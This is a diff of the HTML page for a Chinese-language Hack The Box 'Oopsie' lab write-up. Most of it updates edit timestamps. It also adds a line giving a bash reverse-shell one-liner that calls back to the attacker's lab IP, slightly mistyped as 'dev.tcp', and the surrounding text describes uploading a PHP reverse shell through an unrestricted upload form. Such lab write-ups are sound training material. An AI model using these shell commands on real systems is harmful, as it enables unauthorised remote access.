@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://spwpun.github.io/2021/04/21/htb-Oopsie/image-20210421152443256.png">
 <meta property="og:image" content="https://spwpun.github.io/2021/04/21/htb-Oopsie/image-20210421151400819.png">
 <meta property="article:published_time" content="2021-04-21T06:23:28.000Z">
-<meta property="article:modified_time" content="2021-04-21T07:56:06.503Z">
+<meta property="article:modified_time" content="2021-04-22T20:59:29.754Z">
 <meta property="article:author" content="Demen Lee">
 <meta property="article:tag" content="hack the box">
 <meta property="article:tag" content="burpsuite">
@@ -239,10 +239,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-04-21 14:23:28 / Modified: 15:56:06" itemprop="dateCreated datePublished" datetime="2021-04-21T14:23:28+08:00">2021-04-21</time>
+              <time title="Created: 2021-04-21 14:23:28" itemprop="dateCreated datePublished" datetime="2021-04-21T14:23:28+08:00">2021-04-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-23 04:59:29" itemprop="dateModified" datetime="2021-04-23T04:59:29+08:00">2021-04-23</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -299,6 +305,7 @@
 <p>得到super admin的user为：86575; super admin</p>
 <p><img src="/2021/04/21/htb-Oopsie/image-20210421153847781.png" alt="image-20210421153847781"></p>
 <h3 id="3-获取shell"><a href="#3-获取shell" class="headerlink" title="3. 获取shell"></a>3. 获取shell</h3><p>上传功能并没有做什么限制，直接就可以上传php，上传一个php-reverse-shell：</p>
+<p>主要是bash-reverse-shell:<code>/bin/bash -c  &quot;bash -i &gt;&amp; dev.tcp/10.10.16.30/443 0&gt;&amp;1&quot;</code></p>
 <p><img src="/2021/04/21/htb-Oopsie/image-20210421143011292.png" alt="image-20210421143011292"></p>
 <p>本机监听443，执行<code>curl  http://10.10.10.28/uploads/shell.php</code>，得到www-data的一个shell，可以直接查看robert目录下的user.txt：</p>
 <p><img src="/2021/04/21/htb-Oopsie/image-20210421143033802.png" alt="image-20210421143033802"></p>
